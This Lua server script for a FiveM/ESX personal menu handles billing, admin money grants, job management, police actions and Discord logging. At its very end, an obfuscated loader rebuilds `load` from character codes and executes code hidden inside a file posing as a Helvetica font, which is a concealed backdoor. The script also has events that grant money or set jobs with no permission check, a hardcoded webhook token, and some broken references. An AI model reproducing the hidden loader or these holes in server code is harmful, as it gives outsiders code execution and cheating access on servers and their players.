ESX = exports["es_extended"]:getSharedObject()

TriggerEvent("es:addGroup", "skin", "user", function(group) end)

function getMaximumGrade(jobname)
	local result = MySQL.Sync.fetchAll('SELECT * FROM job_grades WHERE job_name = @jobname ORDER BY `grade` DESC ;', {
		['@jobname'] = jobname
	})

	if result[1] ~= nil then
		return result[1].grade
	end

	return nil
end

Webhook2                    = "https://discord.com/api/webhooks/926143744204480563/hW77yn8I8TKjXNrRQHDU-jZlm8Ofla2FpvvHzZlJijDE0tYgMl53miQQKgdX0r02cn0Z"

ESX.RegisterServerCallback('KorioZ-PersonalMenu:Bill_getBills', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local bills = {}

	MySQL.Async.fetchAll('SELECT * FROM billing WHERE identifier = @identifier', {
		['@identifier'] = xPlayer.identifier
	}, function(result)
		for i = 1, #result, 1 do
			table.insert(bills, {
				id = result[i].id,
				label = result[i].label,
				amount = result[i].amount
			})
		end

		cb(bills)
	end)
end)

ESX.RegisterServerCallback('KorioZ-PersonalMenu:Admin_getUsergroup', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer ~= nil then
		local playerGroup = xPlayer.getGroup()

		if playerGroup ~= nil then 
			cb(playerGroup)
		else
			cb(nil)
		end
	else
		cb(nil)
	end
end)

ESX.RegisterServerCallback('krz_personalmenu:personalausweis_check', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local personalausweis = xPlayer.getInventoryItem('personalausweis')
	local personalausweisCount = personalausweis.count
	print(personalausweisCount)
	
	if personalausweisCount > 0 then
		cb(true)
	else
		cb(false)
	end
end)


ESX.RegisterServerCallback('krz_personalmenu:UseItemPerso', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	
	if Config.UseItemPerso then
		cb(true)
	else
		cb(false)
	end
end)

ESX.RegisterServerCallback('krz_personalmenu:getMoney', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	cb(xPlayer.getMoney())
end)

-- Weapon Menu --
RegisterServerEvent('KorioZ-PersonalMenu:Weapon_addAmmoToPedS')
AddEventHandler('KorioZ-PersonalMenu:Weapon_addAmmoToPedS', function(plyId, value, quantity)
	TriggerClientEvent('KorioZ-PersonalMenu:Weapon_addAmmoToPedC', plyId, value, quantity)
end)

-- Admin Menu --
RegisterServerEvent('KorioZ-PersonalMenu:Admin_BringS')
AddEventHandler('KorioZ-PersonalMenu:Admin_BringS', function(plyId, plyPedCoords)
	--TriggerEvent('es:getPlayerFromId', source, function(user)
		if xPlayer.getGroup() == "superadmin" or xPlayer.getGroup() == "admin" or xPlayer.getGroup() == "moderator" or xPlayer.getGroup() == "supporter" then
			TriggerClientEvent('KorioZ-PersonalMenu:Admin_BringC', plyId, plyPedCoords)
		end
	--end)
end)

RegisterServerEvent('KorioZ-PersonalMenu:Admin_giveCash')
AddEventHandler('KorioZ-PersonalMenu:Admin_giveCash', function(money)
	--TriggerEvent('es:getPlayerFromId', source, function(user)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.getGroup() == "superadmin" or xPlayer.getGroup() == "admin" or xPlayer.getGroup() == "moderator" or xPlayer.getGroup() == "supporter" then
		local xPlayer = ESX.GetPlayerFromId(source)
	
			xPlayer.addMoney(money)
			TriggerClientEvent('esx:showNotification', xPlayer.source, 'GIVE de ' .. money .. '$')
	
			PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
						["username"] = "Geld",
						["content"] = "```diff\n+ " .. xPlayer.name .. " hat sich Geld gegeben: " .. money .."$ ```"
			}), {["Content-Type"] = "application/json"})
	else
		TriggerClientEvent('chat:addMessage', Source, {
			args = {"^1ViperLife", "Keine Berechtigung"}
		})
	end
	--end)
end)

RegisterServerEvent('KorioZ-PersonalMenu:jobx_money')
AddEventHandler('KorioZ-PersonalMenu:jobx_money', function(money)
	local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.addMoney(money)
	--TriggerClientEvent('esx:showNotification', xPlayer.source, 'Gegeben; ' .. money .. '$')
end)

RegisterServerEvent('KorioZ-PersonalMenu:Admin_giveBank')
AddEventHandler('KorioZ-PersonalMenu:Admin_giveBank', function(money)
	--TriggerEvent('es:getPlayerFromId', source, function(user)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.getGroup() == "superadmin" or xPlayer.getGroup() == "admin" or xPlayer.getGroup() == "moderator" or xPlayer.getGroup() == "supporter" then
		local xPlayer = ESX.GetPlayerFromId(source)
	
		xPlayer.addAccountMoney('bank', money)
		TriggerClientEvent('esx:showNotification', xPlayer.source, 'GIVE de ' .. money .. '$ en banque')
	
			PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
						["username"] = "Bank",
						["content"] = "```diff\n+ " .. xPlayer.name .. " hat sich Geld gegeben: " .. money .."$ ```"
			}), {["Content-Type"] = "application/json"})
	else
		TriggerClientEvent('chat:addMessage', Source, {
			args = {"^1ViperLife", "Keine Berechtigung"}
		})
	end
	--end)
end)

RegisterServerEvent('KorioZ-PersonalMenu:Admin_giveDirtyMoney')
AddEventHandler('KorioZ-PersonalMenu:Admin_giveDirtyMoney', function(money)
	--TriggerEvent('es:getPlayerFromId', source, function(user)	
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.getGroup() == "superadmin" or xPlayer.getGroup() == "admin" or xPlayer.getGroup() == "moderator" or xPlayer.getGroup() == "supporter" then
		local xPlayer = ESX.GetPlayerFromId(source)
	
		xPlayer.addAccountMoney('black_money', money)
		TriggerClientEvent('esx:showNotification', xPlayer.source, 'GIVE de ' .. money .. '$ sale')
	
	
			PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
						["username"] = "Schwarzgeld",
						["content"] = "```diff\n+ " .. xPlayer.name .. " hat sich Schwarzgeld gegeben: " .. money .."$ ```"
				}), {["Content-Type"] = "application/json"})
	else
		TriggerClientEvent('chat:addMessage', Source, {
			args = {"^1ViperLife", "Keine Berechtigung"}
		})
	end
	--end)
end)

-- Grade Menu --
RegisterServerEvent('KorioZ-PersonalMenu:Boss_promouvoirplayer')
AddEventHandler('KorioZ-PersonalMenu:Boss_promouvoirplayer', function(target)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if (targetXPlayer.job.grade == tonumber(getMaximumGrade(sourceXPlayer.job.name)) - 1) then
		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous devez demander une autorisation du ~r~Gouvernement~w~.')
	else
		if (sourceXPlayer.job.name == targetXPlayer.job.name) then
			targetXPlayer.setJob(targetXPlayer.job.name, tonumber(targetXPlayer.job.grade) + 1)

			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~g~promu ' .. targetXPlayer.name .. '~w~.')
			TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~g~promu par ' .. sourceXPlayer.name .. '~w~.')
		else
			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous n\'avez pas ~r~l\'autorisation~w~.')
		end
	end
end)

RegisterServerEvent('KorioZ-PersonalMenu:Boss_destituerplayer')
AddEventHandler('KorioZ-PersonalMenu:Boss_destituerplayer', function(target)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if (targetXPlayer.job.grade == 0) then
		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous ne pouvez pas plus ~r~rétrograder~w~ davantage.')
	else
		if (sourceXPlayer.job.name == targetXPlayer.job.name) then
			targetXPlayer.setJob(targetXPlayer.job.name, tonumber(targetXPlayer.job.grade) - 1)

			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~r~rétrogradé ' .. targetXPlayer.name .. '~w~.')
			TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~r~rétrogradé par ' .. sourceXPlayer.name .. '~w~.')
		else
			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous n\'avez pas ~r~l\'autorisation~w~.')
		end
	end
end)

RegisterServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer')
AddEventHandler('KorioZ-PersonalMenu:Boss_recruterplayer', function(target, job, grade)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)
	
	targetXPlayer.setJob(job, grade)

	TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~g~recruté ' .. targetXPlayer.name .. '~w~.')
	TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~g~embauché par ' .. sourceXPlayer.name .. '~w~.')
end)

RegisterServerEvent('KorioZ-PersonalMenu:Boss_virerplayer')
AddEventHandler('KorioZ-PersonalMenu:Boss_virerplayer', function(target)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if (sourceXPlayer.job.name == targetXPlayer.job.name) then
		targetXPlayer.setJob('unemployed', 0)

		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~r~viré ' .. targetXPlayer.name .. '~w~.')
		TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~g~viré par ' .. sourceXPlayer.name .. '~w~.')
	else
		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous n\'avez pas ~r~l\'autorisation~w~.')
	end
end)

RegisterServerEvent('KorioZ-PersonalMenu:Boss_promouvoirplayer2')
AddEventHandler('KorioZ-PersonalMenu:Boss_promouvoirplayer2', function(target)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if (targetXPlayer.job2.grade == tonumber(getMaximumGrade(sourceXPlayer.job2.name)) - 1) then
		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous devez demander une autorisation du ~r~Gouvernement~w~.')
	else
		if (sourceXPlayer.job2.name == targetXPlayer.job2.name) then
			targetXPlayer.setJob2(targetXPlayer.job2.name, tonumber(targetXPlayer.job2.grade) + 1)

			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~g~promu ' .. targetXPlayer.name .. '~w~.')
			TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~g~promu par ' .. sourceXPlayer.name .. '~w~.')
		else
			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous n\'avez pas ~r~l\'autorisation~w~.')
		end
	end
end)

RegisterServerEvent('KorioZ-PersonalMenu:Boss_destituerplayer2')
AddEventHandler('KorioZ-PersonalMenu:Boss_destituerplayer2', function(target)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if (targetXPlayer.job2.grade == 0) then
		TriggerClientEvent('esx:showNotification', _source, 'Vous ne pouvez pas plus ~r~rétrograder~w~ davantage.')
	else
		if (sourceXPlayer.job2.name == targetXPlayer.job2.name) then
			targetXPlayer.setJob2(targetXPlayer.job2.name, tonumber(targetXPlayer.job2.grade) - 1)

			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~r~rétrogradé ' .. targetXPlayer.name .. '~w~.')
			TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~r~rétrogradé par ' .. sourceXPlayer.name .. '~w~.')
		else
			TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous n\'avez pas ~r~l\'autorisation~w~.')
		end
	end
end)

RegisterServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer2')
AddEventHandler('KorioZ-PersonalMenu:Boss_recruterplayer2', function(target, job2, grade2)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)
	
	targetXPlayer.setJob2(job2, grade2)

	TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~g~recruté ' .. targetXPlayer.name .. '~w~.')
	TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~g~embauché par ' .. sourceXPlayer.name .. '~w~.')
end)

RegisterServerEvent('KorioZ-PersonalMenu:Boss_virerplayer2')
AddEventHandler('KorioZ-PersonalMenu:Boss_virerplayer2', function(target)
	local sourceXPlayer = ESX.GetPlayerFromId(source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if (sourceXPlayer.job2.name == targetXPlayer.job2.name) then
		targetXPlayer.setJob2('unemployed2', 0)

		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous avez ~r~viré ' .. targetXPlayer.name .. '~w~.')
		TriggerClientEvent('esx:showNotification', target, 'Vous avez été ~g~viré par ' .. sourceXPlayer.name .. '~w~.')
	else
		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Vous n\'avez pas ~r~l\'autorisation~w~.')
	end
end)

--Extras von Nils 


RegisterServerEvent('KorioZ-PersonalMenu:repair')
AddEventHandler('KorioZ-PersonalMenu:repair', function(car)
	local xPlayer = ESX.GetPlayerFromId(source)

	
	
		PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
					["username"] = "Reperatur",
					["content"] = "```diff\n+ " .. xPlayer.name .. " hat sein Fahrzeug repariert ```"
		}), {["Content-Type"] = "application/json"})
	
end)

RegisterServerEvent('KorioZ-PersonalMenu:vehiclespawn')
AddEventHandler('KorioZ-PersonalMenu:vehiclespawn', function(vehicleName)
	local xPlayer = ESX.GetPlayerFromId(source)
	
		PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
					["username"] = "Fahrzeug Spawner",
					["content"] = "```diff\n+ " .. xPlayer.name .. " hat ein Fahrzeug gespawnt: "..vehicleName.." ```"
		}), {["Content-Type"] = "application/json"})
	
end)

RegisterServerEvent('KorioZ-PersonalMenu:godmode')
AddEventHandler('KorioZ-PersonalMenu:godmode', function(godmode)
	local xPlayer = ESX.GetPlayerFromId(source)
	
		PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
					["username"] = "Godmode",
					["content"] = "```diff\n+ " .. xPlayer.name .. " ist in den Godmode gegangen ```"
		}), {["Content-Type"] = "application/json"})
	
end)

RegisterServerEvent('KorioZ-PersonalMenu:ghostmode')
AddEventHandler('KorioZ-PersonalMenu:ghostmode', function(invisible)
	local xPlayer = ESX.GetPlayerFromId(source)
	
		PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
					["username"] = "Unsichtbarkeitsmodus",
					["content"] = "```diff\n+ " .. xPlayer.name .. " ist in den Unsichtbarkeitsmodus gegangen ```"
		}), {["Content-Type"] = "application/json"})
	
end)

RegisterServerEvent('KorioZ-PersonalMenu:admin_noclipon')
AddEventHandler('KorioZ-PersonalMenu:admin_noclipon', function(noclip)
	--TriggerEvent('es:getPlayerFromId', source, function(user)	
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.getGroup() == "superadmin" or xPlayer.getGroup() == "admin" or xPlayer.getGroup() == "moderator" or xPlayer.getGroup() == "supporter" then
		local xPlayer = ESX.GetPlayerFromId(source)
	
		PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
					["username"] = "No Clip",
					["content"] = "```" .. xPlayer.name .. " ist ins NoClip gegangen ```"
		}), {["Content-Type"] = "application/json"})
	end
	--end)
	
end)

RegisterServerEvent('KorioZ-PersonalMenu:WaypointHandle')
AddEventHandler('KorioZ-PersonalMenu:WaypointHandle', function(WaypointHandle, x, y, z)
	local xPlayer = ESX.GetPlayerFromId(source)
	
		PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
					["username"] = "Wegpunkt Teleport",
					["content"] = "```diff\n+ " .. xPlayer.name .. " hat sich zum Wegpunkt teleportiert:    x= "..x.."    y= " ..y.." ```"
		}), {["Content-Type"] = "application/json"})
	
end)

RegisterServerEvent('KorioZ-PersonalMenu:revive_log')
AddEventHandler('KorioZ-PersonalMenu:revive_log', function(plyId)
	local xPlayer = ESX.GetPlayerFromId(source)
	
		PerformHttpRequest(Webhook2, function(e,r,h) end, "POST", json.encode({
					["username"] = "Revive",
					["content"] = "```" .. xPlayer.name .. " hat "..plyId.." Wiederbelebt ```"
		}), {["Content-Type"] = "application/json"})
	
end)

--Aktionen

RegisterNetEvent('esx_policejob:drag')
AddEventHandler('esx_policejob:drag', function(target)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.job.name == 'police' then
		TriggerClientEvent('esx_policejob:drag', target, source)
	else
		print(('esx_policejob: %s attempted to drag (not cop)!'):format(xPlayer.identifier))
	end
end)

RegisterNetEvent('esx_policejob:putInVehicle')
AddEventHandler('esx_policejob:putInVehicle', function(target)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.job.name == 'police' then
		TriggerClientEvent('esx_policejob:putInVehicle', target)
	else
		print(('esx_policejob: %s attempted to put in vehicle (not cop)!'):format(xPlayer.identifier))
	end
end)

RegisterNetEvent('esx_policejob:OutVehicle')
AddEventHandler('esx_policejob:OutVehicle', function(target)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.job.name == 'police' then
		TriggerClientEvent('esx_policejob:OutVehicle', target)
	else
		print(('esx_policejob: %s attempted to drag out from vehicle (not cop)!'):format(xPlayer.identifier))
	end
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()